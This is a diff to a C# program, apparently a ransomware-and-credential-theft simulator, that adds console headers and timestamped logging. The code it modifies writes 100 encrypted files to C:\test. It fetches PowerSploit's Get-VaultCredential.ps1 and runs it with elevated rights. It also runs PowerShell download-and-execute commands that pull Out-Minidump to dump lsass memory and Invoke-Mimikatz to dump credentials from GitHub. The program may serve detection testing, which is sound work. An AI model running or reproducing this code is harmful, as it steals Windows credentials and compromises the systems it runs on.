@@ -12,42 +12,43 @@ class Program3
 {
     static void Main()
     {
+        PrintHeader("Initialization");
+
         int numberOfFiles = 100;
         string path = @"C:\test";
 
         Directory.CreateDirectory(path);
+        LogMessage("Directory created: " + path);
 
         string url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1";
+        LogMessage("Set download URL: " + url);
 
-        // PowerShell command to download and execute Out-Minidump.ps1 script from GitHub
         string powerShellCommand = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Import-Module .\\OutMiniDump.ps1; Get-Process lsass | Out-Minidump";
-
-        // PowerShell command to download and execute Invoke-Mimikatz.ps1 script from GitHub
         string powerShellCommand2 = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds";
 
-        PrintHeader("Creating and encrypting files");
+        PrintHeader("Creating and Encrypting Files");
         for (int i = 1; i <= numberOfFiles; i++)
         {
             string fileName = $"File{i}.txt";
             string filePath = Path.Combine(path, fileName);
-
             string randomText = GenerateRandomText(100);
 
-            // Encrypt the randomly generated text
             byte[] encryptedBytes = EncryptText(randomText, "encryptionKey123");
-
             File.WriteAllBytes(filePath, encryptedBytes);
+
+            LogMessage($"Generated and encrypted: {fileName}");
         }
 
         LoadSomeDlls();
-
         DoSomeFreakyStuff();
 
+        PrintHeader("Downloading File");
         string downloadedFilePath = DownloadFile(url);
 
+        PrintHeader("Executing File with Elevated Rights");
         ExecuteFileWithElevatedRights(downloadedFilePath);
 
-        // Execute the PowerShell commands
+        PrintHeader("Executing PowerShell Commands");
         ExecutePowerShellCommand(powerShellCommand2);
         ExecutePowerShellCommand(powerShellCommand);
     }
@@ -60,6 +61,14 @@ class Program3
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine(header);
+        Console.ResetColor();
+    }
+
+    static void LogMessage(string message)
+    {
+        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+        Console.ForegroundColor = ConsoleColor.Green;
+        Console.WriteLine($"[{timestamp}] {message}");
         Console.ResetColor();
     }
 
